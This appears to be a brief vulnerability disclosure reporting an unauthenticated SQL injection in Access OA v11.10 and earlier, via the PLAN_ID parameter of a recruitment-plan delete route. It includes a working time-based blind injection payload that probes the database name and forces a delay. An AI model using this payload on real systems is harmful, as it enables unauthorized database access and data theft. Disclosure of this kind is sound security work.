Unauthorized SQL injection vulnerability exists in Access OA

version:v11.10 or earlier

Routing: general/hr/recruit/plan/delete. PHP

The injected parameter $PLAN_ID exists

poc
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

The page has obvious delay, indicating that SQL injection vulnerability exists
![WPS图片(1)](https://github.com/husterdjx/cve/assets/80690447/5fd73294-da88-42a8-ad7b-57c9b79c1679)
